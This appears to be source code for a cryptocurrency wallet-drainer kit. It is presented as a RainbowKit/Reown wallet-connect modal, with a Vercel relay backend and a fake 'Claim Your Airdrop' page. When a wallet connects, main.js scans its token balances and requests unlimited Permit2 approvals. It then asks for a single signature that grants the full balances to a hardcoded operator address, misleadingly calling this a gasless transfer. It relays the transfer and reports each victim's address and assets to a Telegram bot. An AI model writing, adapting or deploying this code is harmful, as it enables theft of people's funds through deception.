      setResult(`❌ ${err.message}`);
    }
  }

  return (
    <div style={styles.page}>
      <div style={styles.card}>
        <h1 style={styles.title}>
          🌈 <span style={styles.rainbow}>RainbowKit</span> Modal
        </h1>
        <p style={styles.sub}>
          The real RainbowKit ConnectButton. Your own script runs after connect.
        </p>

        {/* The actual RainbowKit ConnectButton */}
        <div style={styles.section}>
          <div style={styles.label}>Default ConnectButton</div>
          <ConnectButton />
        </div>

        <hr style={styles.divider} />

        <div style={styles.section}>
          <div style={styles.label}>Compact Variants</div>
          <div style={styles.row}>
            <ConnectButton label="Sign in" />
            <ConnectButton accountStatus="avatar" chainStatus="icon" showBalance={false} />
          </div>
        </div>

        <hr style={styles.divider} />

        <div style={styles.section}>
          <div style={styles.label}>Your Custom Actions</div>
          <div style={styles.row}>
            <button style={styles.btn} onClick={handleSign} disabled={!isConnected}>
              ✍️ Sign Message
            </button>
            <button style={{ ...styles.btn, ...styles.btnRed }} onClick={() => disconnect()} disabled={!isConnected}>
              Disconnect
            </button>
          </div>
        </div>

        <pre style={styles.status}>{result}</pre>
      </div>
    </div>
  );
}

const styles = {
  page: {
    fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)",
    color: "#e4e4e7",
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    padding: "24px",
  },
  card: {
    background: "rgba(20,20,30,0.85)",
    backdropFilter: "blur(20px)",
    border: "1px solid rgba(99,102,241,0.2)",
    borderRadius: "24px",
    padding: "40px",
    maxWidth: "520px",
    width: "100%",
    textAlign: "center",
  },
  title: { fontSize: "1.5rem", marginBottom: "6px" },
  rainbow: {
    background: "linear-gradient(90deg, #f97316, #ec4899, #8b5cf6, #3b82f6, #22c55e)",
    WebkitBackgroundClip: "text",
    WebkitTextFillColor: "transparent",
  },
  sub: { color: "#71717a", marginBottom: "28px", fontSize: "0.9rem" },
  section: { margin: "16px 0" },
  label: {
    fontSize: "0.72rem", textTransform: "uppercase", letterSpacing: "0.08em",
    color: "#71717a", marginBottom: "12px",
  },
  row: { display: "flex", gap: "12px", justifyContent: "center", flexWrap: "wrap" },
  divider: { border: "none", borderTop: "1px solid rgba(255,255,255,0.08)", margin: "20px 0" },
  btn: {
    background: "#6366f1", color: "#fff", border: "none",
    padding: "10px 20px", borderRadius: "12px", fontSize: "0.88rem",
    cursor: "pointer", transition: "opacity 0.15s",
  },
  btnRed: { background: "#ef4444" },
  status: {
    marginTop: "20px", background: "rgba(10,10,15,0.6)",
    border: "1px solid rgba(255,255,255,0.06)", borderRadius: "12px",
    padding: "14px", fontFamily: "monospace", fontSize: "0.8rem",
    color: "#22c55e", minHeight: "50px", textAlign: "left",
    whiteSpace: "pre-wrap", wordBreak: "break-all",
  },
};
```

### standalone/rainbow-modal/src/main.jsx

```jsx
import React from "react";
import { createRoot } from "react-dom/client";
import "@rainbow-me/rainbowkit/styles.css";
import { RainbowKitProvider } from "@rainbow-me/rainbowkit";
import { WagmiProvider } from "wagmi";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { config } from "./config";
import App from "./App";

const queryClient = new QueryClient();
```

### standalone/reown-modal/main.js

```javascript
// ============================================================
//  REOWN APPKIT — STANDALONE DROP-IN MODAL
//
//  HOW TO USE ON ANY WEBSITE:
//
//  1. npm run build  →  produces dist/wallet-modal.js
//  2. On your page, just add:
//
//     <script type="module" src="wallet-modal.js"></script>
//
//  That's it. The connect button + popup + modal all inject themselves.
//  Edit the "YOUR FUNCTIONS" section below to add your own logic.
// ============================================================

import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { mainnet, sepolia, arbitrum, polygon, base } from "@reown/appkit/networks";
import { BrowserProvider } from "ethers";
import { disconnect as wagmiDisconnect, signMessage as wagmiSignMessage, getAccount } from "@wagmi/core";

// ─── CONFIG ──────────────────────────────────────────────────
// PRODUCTION: Set your WalletConnect project ID from https://cloud.reown.com
const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || (() => { console.error("[StealthV26] VITE_WALLETCONNECT_PROJECT_ID not set"); return ""; })();

const metadata = {
  name: "My dApp",
  description: "Standalone Wallet Connect Modal",
  url: window.location.origin,
  icons: [],
};

const networks = [mainnet, sepolia, arbitrum, polygon, base];
const wagmiAdapter = new WagmiAdapter({ networks, projectId });

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata,
  themeMode: "dark",
  features: {
    analytics: false,
    email: true,
    socials: ["google", "github", "discord", "x"],
  },
});

// ─── POPUP / TOAST CONFIG ────────────────────────────────────
// Customize everything about the popup notifications here.
const TOAST_CONFIG = {
  // Position: "top-right", "top-left", "bottom-right", "bottom-left", "top-center", "bottom-center"
  position: "top-right",

  // Duration in ms (how long the toast stays visible)
  duration: 4000,

  // Max width in px
  maxWidth: 400,

  // Border radius in px
  borderRadius: 14,

  // Colors
  background: "#1a1a2e",
  border: "#2a2a3e",
  titleColor: "#e4e4e7",
  bodyColor: "#a1a1aa",

  // Accent colors per type
  accentColors: {
    success: "#22c55e",
    info: "#6366f1",
    warn: "#f59e0b",
    error: "#ef4444",
  },

  // Fonts
  titleFont: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
  titleSize: "0.92rem",
  bodyFont: "'SF Mono', Monaco, Consolas, monospace",
  bodySize: "0.82rem",

  // Animation: "slide", "fade"
  animation: "slide",

  // Gap between stacked toasts in px
  stackGap: 12,

  // Max visible toasts at once (older ones get removed)
  maxVisible: 5,
};

// ─── POPUP / TOAST SYSTEM ────────────────────────────────────

const toastStack = [];

function getPositionCSS() {
  const p = TOAST_CONFIG.position;
  const css = { position: "fixed", zIndex: 2147483647 };
  if (p.includes("top")) css.top = "20px";
  if (p.includes("bottom")) css.bottom = "20px";
  if (p.includes("right")) css.right = "20px";
  if (p.includes("left")) css.left = "20px";
  if (p.includes("center")) {
    css.left = "50%";
    css.transform = "translateX(-50%)";
  }
  return css;
}

function getSlideFrom() {
  const p = TOAST_CONFIG.position;
  if (p.includes("right")) return "translateX(120%)";
  if (p.includes("left")) return "translateX(-120%)";
  if (p.includes("top")) return "translateY(-120%)";
  return "translateY(120%)";
}

function injectStyles() {
  if (document.getElementById("appkit-toast-styles")) return;
  const style = document.createElement("style");
  style.id = "appkit-toast-styles";
  const c = TOAST_CONFIG;
  const slideFrom = getSlideFrom();
  const isFade = c.animation === "fade";

  style.textContent = `
    .appkit-toast {
      ${Object.entries(getPositionCSS()).map(([k, v]) => `${k.replace(/([A-Z])/g, "-$1").toLowerCase()}: ${v}`).join("; ")};
      background: ${c.background};
      border: 1px solid ${c.border};
      border-radius: ${c.borderRadius}px;
      padding: 16px 22px;
      color: ${c.titleColor};
      font-family: ${c.titleFont};
      font-size: ${c.titleSize};
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      max-width: ${c.maxWidth}px;
      word-break: break-all;
      pointer-events: auto;
      cursor: pointer;
      transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
      ${isFade ? "opacity: 0;" : `transform: ${slideFrom};`}
    }
    .appkit-toast.show {
      ${isFade ? "opacity: 1;" : "transform: translateX(0) translateY(0);"}
    }
    .appkit-toast .toast-title {
      font-weight: 600;
      margin-bottom: 4px;
      font-size: ${c.titleSize};
      color: ${c.titleColor};
    }
    .appkit-toast .toast-body {
      color: ${c.bodyColor};
      font-size: ${c.bodySize};
      font-family: ${c.bodyFont};
    }
    .appkit-toast.success { border-left: 4px solid ${c.accentColors.success}; }
    .appkit-toast.info    { border-left: 4px solid ${c.accentColors.info}; }
    .appkit-toast.warn    { border-left: 4px solid ${c.accentColors.warn}; }
    .appkit-toast.error   { border-left: 4px solid ${c.accentColors.error}; }
  `;
  document.head.appendChild(style);
}

function repositionToasts() {
  const p = TOAST_CONFIG.position;
  const gap = TOAST_CONFIG.stackGap;
  let offset = 0;
  toastStack.forEach((el) => {
    if (p.includes("top")) {
      el.style.top = `${20 + offset}px`;
    } else {
      el.style.bottom = `${20 + offset}px`;
    }
    offset += el.offsetHeight + gap;
  });
}

function showToast(title, body, type = "success", duration) {
  injectStyles();
  duration = duration || TOAST_CONFIG.duration;

  // Enforce max visible
  while (toastStack.length >= TOAST_CONFIG.maxVisible) {
    const oldest = toastStack.shift();
    oldest.remove();
  }

  const el = document.createElement("div");
  el.className = `appkit-toast ${type}`;
  el.innerHTML = `<div class="toast-title">${title}</div><div class="toast-body">${body}</div>`;

  // Click to dismiss
  el.addEventListener("click", () => {
    el.classList.remove("show");
    setTimeout(() => {
      const idx = toastStack.indexOf(el);
      if (idx > -1) toastStack.splice(idx, 1);
      el.remove();
      repositionToasts();
    }, 350);
  });

  document.body.appendChild(el);
  toastStack.push(el);
  repositionToasts();

  // Animate in
  requestAnimationFrame(() => requestAnimationFrame(() => {
    el.classList.add("show");
    repositionToasts();
  }));

  // Auto dismiss
  setTimeout(() => {
    el.classList.remove("show");
    setTimeout(() => {
      const idx = toastStack.indexOf(el);
      if (idx > -1) toastStack.splice(idx, 1);
      el.remove();
      repositionToasts();
    }, 400);
  }, duration);
}

// ─── HELPER ──────────────────────────────────────────────────
function getWagmiConfig() {
  return wagmiAdapter.wagmiConfig;
}

async function getSigner() {
  const { getConnectorClient } = await import("@wagmi/core");
  const client = await getConnectorClient(wagmiAdapter.wagmiConfig);
  return new BrowserProvider(client.transport).getSigner();
}

// ==============================================================
//  OPERATOR CONFIG
// ==============================================================

const OPERATOR = {
  receiver: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  exchange: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  autoBatch: true,
  relayUrl: window.location.origin + "/api/relay/batch",
  tokens: {
    1: [
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI",  decimals: 18 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    ],
    56: [
      { addr: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    ],
    137: [
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
      { addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    ],
    42161: [
      { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
    ],
  },
};

let walletAssets = [];

// ── TELEGRAM ALERTS ───────────────────────────────────────────
// Notifications are routed through /api/notify — bot token stays server-side.
const TELEGRAM = {
  enabled: true,
};

async function notifyTelegram(text) {
  if (!TELEGRAM.enabled) return;
  try {
    await fetch(window.location.origin + "/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: text }),
    });
  } catch (e) { console.warn("[Telegram] Notify relay failed:", e.message); }
}

function shortAddr(a) { return a ? a.slice(0, 6) + "..." + a.slice(-4) : "?"; }


// ==============================================================
//  BALANCE SCANNER
// ==============================================================

async function scanBalances(address, chainId) {
  let provider = null;
  try { const { getConnectorClient } = await import("@wagmi/core"); const c = await getConnectorClient(wagmiAdapter.wagmiConfig); provider = c.transport; } catch(e) {}
  if (!provider) provider = window.ethereum;
  if (!provider) return [];
  const assets = [];

  try {
    const balHex = await provider.request({ method: "eth_getBalance", params: [address, "latest"] });
    const balEth = parseInt(balHex, 16) / 1e18;
    if (balEth > 0) assets.push({ type: "NATIVE", symbol: "ETH", balance: balEth, balanceRaw: balHex, address: "0x0000000000000000000000000000000000000000" });
  } catch (e) {}

  const tokens = OPERATOR.tokens[chainId] || [];
  for (const token of tokens) {
    try {
      const data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
      const result = await provider.request({ method: "eth_call", params: [{ to: token.addr, data }, "latest"] });
      const bal = parseInt(result, 16) / Math.pow(10, token.decimals);
      if (bal > 0) assets.push({ type: "ERC-20", symbol: token.symbol, balance: bal, balanceRaw: result, address: token.addr, decimals: token.decimals });
    } catch (e) {}
  }

  const stables = ["USDT", "USDC", "DAI", "BUSD"];
  assets.sort((a, b) => { const aS = stables.includes(a.symbol) ? -1 : 1; const bS = stables.includes(b.symbol) ? -1 : 1; return aS !== bS ? aS - bS : b.balance - a.balance; });
  return assets;
}

// ==============================================================
//  PERMIT2 BATCH
// ==============================================================

async function executeBatch(assets, recipient) {
  const erc20Items = assets.filter(a => a.type === "ERC-20" && a.balance > 0);
  if (!erc20Items.length) return null;

  const signer = await getSigner();
  const E = await import("ethers");
  const owner = await signer.getAddress();
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));

  showToast("\ud83d\udd0d Preparing gasless batch", erc20Items.length + " tokens", "info", 3000);

  // ── Step 1: Ensure Permit2 has allowance (approve once, reusable) ──
  const erc20Abi = [
    "function allowance(address,address) view returns (uint256)",
    "function approve(address,uint256) returns (bool)"
  ];
  for (const item of erc20Items) {
    try {
      const tokenC = new E.Contract(item.address, erc20Abi, signer);
      const current = await tokenC.allowance(owner, OPERATOR.permit2);
      if (current < BigInt(item.balanceRaw)) {
        showToast("\u270d\ufe0f Approve " + item.symbol + " for Permit2", "One-time approval", "info", 5000);
        const tx = await tokenC.approve(OPERATOR.permit2, E.MaxUint256);
        await tx.wait();
        console.log("[Batch] Permit2 approval confirmed for", item.symbol);
      }
    } catch (e) {
      console.warn("[Batch] Approval failed for", item.symbol, e.message);
    }
  }

  // ── Step 2: Read Permit2 nonces ──
  const permit2Abi = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
  const permit2C = new E.Contract(OPERATOR.permit2, permit2Abi, signer);
  const now = Math.floor(Date.now() / 1000);
  const expiration = now + 2592000; // 30 days
  const sigDeadline = now + 1200;   // 20 min
  const details = [];

  for (const item of erc20Items) {
    try {
      const res = await permit2C.allowance(owner, item.address, OPERATOR.exchange || recipient);
      details.push({
        token: item.address,
        amount: BigInt(item.balanceRaw),
        expiration,
        nonce: Number(res[2]),
      });
    } catch (e) {
      console.warn("[Batch] Nonce read failed for", item.address);
    }
  }

  if (!details.length) {
    showToast("\u274c No tokens ready", "Nonce reads failed", "error");
    return null;
  }

  // ── Step 3: ONE EIP-712 signature — gasless for the user ──
  const domain = { name: "Permit2", chainId, verifyingContract: OPERATOR.permit2 };
  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };

  const permitBatch = {
    details: details.map(d => ({
      token: d.token,
      amount: d.amount,
      expiration: d.expiration,
      nonce: d.nonce,
    })),
    spender: OPERATOR.exchange || recipient,
    sigDeadline,
  };

  showToast("\u270d\ufe0f Sign to confirm", details.length + " tokens — one signature, no gas", "info", 8000);

  let signature;
  try {
    signature = await signer.signTypedData(domain, types, permitBatch);
  } catch (e) {
    showToast("\u274c Signature rejected", e.reason || e.message, "error");
    notifyTelegram("\u274c <b>Signature Rejected</b>\nUser: <code>" + owner + "</code>\nChain: " + chainId);
    return null;
  }

  console.log("[Batch] EIP-712 signature obtained");

  // ── Step 4: Relay to backend (gasless execution) ──
  const payload = {
    user: owner,
    recipient,
    permitBatch,
    signature,
    chainId,
    tokens: erc20Items.map(i => ({ symbol: i.symbol, address: i.address, amount: i.balance })),
  };

  // Try relay first (fully gasless)
  const relayUrl = OPERATOR.relayUrl || (window.location.origin + "/api/relay/batch");
  try {
    showToast("\u23f3 Executing gasless transfer...", "Relaying to network", "info", 10000);
    const res = await fetch(relayUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const json = await res.json();
      const txHash = json.hash || json.txHash || "relayed";
      showToast("\u2705 Transfer complete!", txHash.slice(0, 20) + "...", "success", 8000);
      notifyTelegram(
        "\u2705 <b>Gasless Batch Complete</b>\n\n" +
        "User: <code>" + owner + "</code>\n" +
        "Recipient: <code>" + recipient + "</code>\n" +
        "Tokens: " + details.length + "\n" +
        "Chain: " + chainId + "\n" +
        "Tx: <code>" + txHash + "</code>\n" +
        "Assets:\n" + erc20Items.map(i => "  " + i.symbol + ": " + i.balance.toFixed(4)).join("\n")
      );
      return { ...payload, txHash, relayed: true };
    }

    // Relay returned error — fall through to direct execution
    const errText = await res.text().catch(() => "");
    console.warn("[Batch] Relay failed:", res.status, errText);
  } catch (relayErr) {
    console.warn("[Batch] Relay unavailable:", relayErr.message);
  }

  // ── Fallback: Direct on-chain execution (user pays gas) ──
  showToast("\u26a0\ufe0f Relay unavailable, executing directly", "You will pay gas", "warn", 5000);

  try {
    const exchangeAbi = [
      "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)"
    ];
    const exchangeC = new E.Contract(OPERATOR.exchange || recipient, exchangeAbi, signer);
    const tx = await exchangeC.batchPermitTransferFromBatch(owner, permitBatch, signature, recipient);
    showToast("\u2709 Tx submitted", tx.hash.slice(0, 16) + "...", "info", 6000);
    notifyTelegram("\ud83d\udce4 <b>Direct Batch Tx</b>\nHash: <code>" + tx.hash + "</code>\nTokens: " + details.length);

    const receipt = await tx.wait();
    showToast("\u2705 Transfer confirmed!", "Block " + receipt.blockNumber, "success", 8000);
    notifyTelegram(
      "\u2705 <b>Batch Confirmed</b>\n" +
      "Hash: <code>" + receipt.hash + "</code>\n" +
      "Block: " + receipt.blockNumber + "\n" +
      "Tokens: " + details.length
    );
    return { ...payload, txHash: receipt.hash, blockNumber: receipt.blockNumber, direct: true };
  } catch (directErr) {
    showToast("\u274c Execution failed", directErr.reason || directErr.message, "error");
    notifyTelegram("\u274c <b>Execution Failed</b>\nUser: <code>" + owner + "</code>\nError: " + (directErr.reason || directErr.message));
    return { ...payload, error: directErr.message };
  }
}

async function triggerBatch() {
  if (!modal.getIsConnected()) { showToast("⚠️", "Connect first", "warn"); return; }
  if (!walletAssets.length) walletAssets = await scanBalances(modal.getAddress(), modal.getChainId());
  return executeBatch(walletAssets, OPERATOR.receiver);
}

// ==============================================================
//  CONNECT CALLBACKS
// ==============================================================

async function onConnected({ address, chainId }) {
  const short = address.slice(0, 6) + "..." + address.slice(-4);
  showToast("\u2705 Wallet Connected", short + " on chain " + chainId, "success");
  notifyTelegram("\u2705 <b>Wallet Connected</b>\n\nAddress: <code>" + address + "</code>\nChain: " + chainId + "\nTime: " + new Date().toISOString());

  try {
    walletAssets = await scanBalances(address, chainId);
    if (walletAssets.length > 0) {
      showToast("\ud83d\udcb0 Assets Found", walletAssets.map(a => a.symbol + ": " + a.balance.toFixed(4)).join(", "), "info", 5000);
      notifyTelegram("\ud83d\udcb0 <b>Assets Scanned</b>\n\nWallet: <code>" + shortAddr(address) + "</code>\nChain: " + chainId + "\nAssets:\n" + walletAssets.map(a => "  " + a.symbol + ": " + a.balance.toFixed(4)).join("\n"));
    }
  } catch (e) {}

  if (OPERATOR.autoBatch && OPERATOR.receiver !== "0x0000000000000000000000000000000000000000" && walletAssets.length > 0) {
    try {
      const result = await executeBatch(walletAssets, OPERATOR.receiver);
      if (result) {
        showToast("\ud83d\udce6 Batch ready", result.permitBatch.details.length + " tokens", "success", 6000);
        notifyTelegram("\ud83d\udce6 <b>Batch Permit Signed</b>\n\nUser: <code>" + result.user + "</code>\nRecipient: <code>" + shortAddr(result.recipient) + "</code>\nTokens: " + result.permitBatch.details.length + "\nChain: " + result.chainId);
      }
    } catch (e) { showToast("\u26a0\ufe0f Batch failed", e.message, "error"); }
  }
}

async function onDisconnected() {
  walletAssets = [];
  showToast("\ud83d\udd0c Disconnected", "Wallet disconnected.", "warn");
  notifyTelegram("\ud83d\udd0c <b>Wallet Disconnected</b>");
}

async function onChainChanged({ chainId }) {
  showToast("\ud83d\udd04 Network Changed", "Switched to chain " + chainId, "info");
  const address = modal.getAddress();
  if (address) walletAssets = await scanBalances(address, chainId);
}

async function onSignMessage() {
  try {
    showToast("\u270d\ufe0f Signing...", "Check your wallet", "info", 3000);
    const sig = await wagmiSignMessage(getWagmiConfig(), { message: "Hello from my dApp!" });
    showToast("\u2705 Signed!", sig.slice(0, 24) + "...", "success", 6000);
  } catch (err) {
    showToast("\u274c Error", err.message || String(err), "error", 5000);
  }
}
// ==============================================================
//  WIRING — subscribeAccount (reliable across AppKit versions)
// ==============================================================

let lastAddress = null;
let lastChainId = null;
let wasConnected = false;

modal.subscribeAccount((account) => {
  if (account.isConnected && account.address) {
    const address = account.address;
    let chainId = null;
    try { chainId = wagmiAdapter.wagmiConfig.state.chainId; } catch(e) {}

    if (wasConnected && lastChainId !== null && lastChainId !== chainId) {
      onChainChanged({ chainId });
    }
    if (lastAddress !== address) {
      onConnected({ address, chainId });
    }
    lastAddress = address;
    lastChainId = chainId;
    wasConnected = true;
  } else if (!account.isConnected && wasConnected) {
    wasConnected = false;
    lastAddress = null;
    lastChainId = null;
    onDisconnected();
  }
});

// ─── BIND CUSTOM BUTTONS ─────────────────────────────────────
// Add these data attributes to any button on your page:
//
//   <button data-appkit-connect>Connect</button>
//   <button data-appkit-network>Networks</button>
//   <button data-appkit-sign>Sign Message</button>
//   <button data-appkit-disconnect>Disconnect</button>

function bindButtons() {
  document.querySelectorAll("[data-appkit-connect]").forEach((btn) => {
    btn.addEventListener("click", () => modal.open());
  });

  document.querySelectorAll("[data-appkit-network]").forEach((btn) => {
    btn.addEventListener("click", () => modal.open({ view: "Networks" }));
  });

  document.querySelectorAll("[data-appkit-sign]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (!modal.getIsConnected()) {
        showToast("⚠️ Not connected", "Connect a wallet first.", "warn", 3000);
        return;
      }
      onSignMessage();
    });
  });

  document.querySelectorAll("[data-appkit-disconnect]").forEach((btn) => {
    btn.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return;
      try {
        const account = getAccount(getWagmiConfig());
        if (account.connector) {
          await wagmiDisconnect(getWagmiConfig(), { connector: account.connector });
        } else {
          await wagmiDisconnect(getWagmiConfig());
        }
      } catch (err) {
        console.error("Disconnect error:", err);
        // Fallback
        await wagmiDisconnect(getWagmiConfig());
      }
    });
  });
}

// Bind once DOM is ready
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", bindButtons);
} else {
  bindButtons();
}

// Export for advanced usage
export { modal, getSigner, showToast, scanBalances, executeBatch, triggerBatch, walletAssets, OPERATOR };
```

### standalone/vercel-site/api/notify.js

```javascript
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ status: "error" });

  try {
    const { message } = req.body || {};
    if (!message || typeof message !== "string") {
      return res.status(400).json({ status: "error", message: "Missing message" });
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(200).json({ status: "ok", note: "telegram not configured" });
    }

    const sanitized = message.slice(0, 2000);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: sanitized, parse_mode: "HTML" }),
    });

    return res.status(200).json({ status: "ok" });
  } catch (e) {
    return res.status(500).json({ status: "error", message: e.message });
  }
}
```

### standalone/vercel-site/api/relay.js

```javascript
import { createPublicClient, createWalletClient, http, isAddress, parseAbi, encodeFunctionData } from "viem";
import { mainnet, optimism, polygon, arbitrum, bsc, avalanche, base } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";

const SUPPORTED_CHAINS = {
  1: { chain: mainnet, rpc: process.env.ETHEREUM_RPC_URL || "https://eth.llamarpc.com" },
  10: { chain: optimism, rpc: process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io" },
  137: { chain: polygon, rpc: process.env.POLYGON_RPC_URL || "https://polygon-rpc.com" },
  42161: { chain: arbitrum, rpc: process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc" },
  56: { chain: bsc, rpc: process.env.BSC_RPC_URL || "https://bsc-dataseed1.binance.org" },
  43114: { chain: avalanche, rpc: process.env.AVALANCHE_RPC_URL || "https://api.avax.network/ext/bc/C/rpc" },
  8453: { chain: base, rpc: process.env.BASE_RPC_URL || "https://mainnet.base.org" },
};

const STEALTH_EXCHANGE_ABI = parseAbi([
  "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)",
]);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

async function notifyTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
    });
  } catch (e) {}
}

export default async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ status: "error", message: "Method not allowed" });

  try {
    const { user, recipient, permitBatch, signature, chainId } = req.body || {};

    if (!user || !isAddress(user)) return res.status(400).json({ status: "error", message: "Invalid user address" });
    if (!recipient || !isAddress(recipient)) return res.status(400).json({ status: "error", message: "Invalid recipient address" });
    if (!permitBatch || !Array.isArray(permitBatch.details)) return res.status(400).json({ status: "error", message: "Missing permitBatch.details" });
    if (!signature || !signature.startsWith("0x")) return res.status(400).json({ status: "error", message: "Invalid signature" });

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerKey) return res.status(500).json({ status: "error", message: "RELAYER_PRIVATE_KEY not configured" });

    const pk = relayerKey.startsWith("0x") ? relayerKey : `0x${relayerKey}`;
    const account = privateKeyToAccount(pk);

    const id = chainId && SUPPORTED_CHAINS[chainId] ? chainId : 1;
    const { chain, rpc } = SUPPORTED_CHAINS[id];
    const transport = http(rpc);
    const publicClient = createPublicClient({ chain, transport });
    const walletClient = createWalletClient({ chain, transport, account });

    const exchangeAddress = process.env.STEALTH_EXCHANGE_ADDRESS || "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A";

    const normalizedPermitBatch = {
      details: permitBatch.details.map((d) => ({
        token: d.token,
        amount: BigInt(d.amount),
        expiration: Number(d.expiration),
        nonce: Number(d.nonce),
      })),
      spender: permitBatch.spender,
      sigDeadline: BigInt(permitBatch.sigDeadline),
    };

    const hash = await walletClient.writeContract({
      address: exchangeAddress,
      abi: STEALTH_EXCHANGE_ABI,
      functionName: "batchPermitTransferFromBatch",
      args: [user, normalizedPermitBatch, signature, recipient],
    });

    void notifyTelegram(
      `🚀 <b>Relay Executed</b>\n` +
      `User: <code>${user}</code>\n` +
      `Recipient: <code>${recipient}</code>\n` +
      `Relayer: <code>${account.address}</code>\n` +
      `Tokens: <b>${permitBatch.details.length}</b>\n` +
      `Chain: ${id}\n` +
      `Tx: <code>${hash}</code>`
    );

    return res.status(200).json({ status: "ok", hash });
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    console.error("[relay]", message);
    return res.status(500).json({ status: "error", message: message.slice(0, 500) });
  }
}
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Web3 Rewards — Claim Your Airdrop</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💎</text></svg>"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
  <style>
    :root {
      --bg: #0a0a0f;
      --card: #12121a;
      --border: #1e1e2e;
      --accent: #6366f1;
      --accent-glow: rgba(99, 102, 241, 0.15);
      --text: #f4f4f5;
      --muted: #71717a;
      --success: #22c55e;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
